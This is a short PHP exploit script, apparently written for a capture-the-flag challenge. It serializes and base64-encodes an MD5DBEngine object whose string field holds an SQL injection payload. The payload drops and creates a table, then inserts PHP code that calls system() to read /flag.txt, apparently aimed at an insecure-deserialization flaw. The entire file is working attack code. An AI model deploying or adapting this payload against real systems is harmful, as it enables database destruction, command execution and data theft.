<?php
class MD5DBEngine {
    private $HashString = "";
    private $objArray = array();

    public function __construct($HashString) {
        $this->HashString = $HashString;
        $this->objArray['obj'] = $this;
    }
}

$obj = new MD5DBEngine("a' OR 1=2; DROP TABLE IF EXISTS EXPLOIT; CREATE TABLE EXPLOIT (value); INSERT INTO EXPLOIT (value) VALUES ('; system(\"cat /flag.txt\");');--");

echo base64_encode(serialize($obj));

?>
